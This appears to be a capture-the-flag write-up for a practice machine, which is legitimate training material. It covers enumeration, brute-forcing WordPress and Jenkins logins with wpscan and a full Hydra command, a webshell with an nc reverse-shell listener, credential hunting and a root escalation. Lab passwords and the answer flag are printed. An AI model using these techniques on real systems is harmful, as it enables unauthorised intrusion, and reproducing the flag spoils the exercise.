# INTERNAL

You have been assigned to a client that wants a penetration test  conducted on an environment due to be released to production in three  weeks. 

**Scope of Work**

The client requests  that an engineer conducts an external, web app, and internal assessment  of the provided virtual environment. The client has asked that minimal  information be provided about the assessment, wanting the engagement  conducted from the eyes of a malicious actor (black box penetration  test). The client has asked that you secure two flags (no location  provided) as proof of exploitation:

- User.txt
- Root.txt

Additionally, the client has provided the following scope allowances:

- Ensure that you modify your hosts file to reflect internal.thm
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope

# NMAP RESULTS

```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# GoBuster Results

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.46.87 
```

```
/blog                 (Status: 301) [Size: 309] [--> http://10.10.46.87/blog/]
/wordpress            (Status: 301) [Size: 314] [--> http://10.10.46.87/wordpress/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.46.87/javascript/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.46.87/phpmyadmin/]
/wp-content           (Status: 301) [Size: 320] [--> http://10.10.46.87/blog/wp-content/]
/wp-includes          (Status: 301) [Size: 321] [--> http://10.10.46.87/blog/wp-includes/]
/blog/wp-login.php
```

#### So we have Wordpress and phpMyAdmin installed..



### Going to /blog/wp-login.php gives us the default wordpress login. I tried admin:test, and Wordpress told us that that was an invalid **PASSWORD** for *admin*... this means that we can try and bruteforce the password.

> I used **wpscan** for this.

## wpscan found a password for admin.

> admin:my2boys

### Since we're wordpress admin we can edit the default template for index.php and spawn a webshell.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4433           
listening on [any] 4433 ...
connect to [10.13.23.8] from (UNKNOWN) [10.10.46.87] 53888
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:24:26 up 56 min,  0 users,  load average: 0.02, 0.25, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

Let's grab linPEAS.

```
aubreanna is the name of the non default user on the box, we can try logging in with the 'my2boys' password.
Nope, password is different.
```

#### Interesting things:

>-rw-r----- 1 root www-data 68 Aug  3  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php                                                                                                                                                                                                                                       
>-rw-r----- 1 root www-data 0 Aug  3  2020 /var/lib/phpmyadmin/config.inc.php
>-rw-r----- 1 root www-data 527 Aug  3  2020 /etc/phpmyadmin/config-db.php
>-rw-r----- 1 root www-data 8 Aug  3  2020 /etc/phpmyadmin/htpasswd.setup

#### Hm, aubreanna is running Jenkins...

> aubrean+  1509  0.6 12.2 2587808 249364 ?      Sl   02:28   0:24          _ java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war

> I think that's a rabbit hole.

### Checking /opt we found a wp-save.txt which has aubreannas creds.

> aubreanna:bubb13guM!@#123

### Logging in as Aubreanna we found out more about that Jenkins install from earlier.

It's running on port 8080 in a docker container. If we set up an SSH tunnel we can access it from our machine!

We got a Jenkins login page, and upon trying default creds nothing happened, so let's try and brute force it with Hydra.

> hydra 127.0.0.1 -s 4444 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt

> ## [4444][http-post-form] host: 127.0.0.1   login: admin   password: spongebob

From here it's pretty easy, we can just set up a new project and run commands whatever user the jenkins install is running as.

> https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

Checking /opt revealed a note.txt...

```
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

![I'm in](https://cdn.dopl3r.com//media/memes_files/hacker-voice-m-in-jvT7Y.jpg)

```bash
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# cd /root
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```

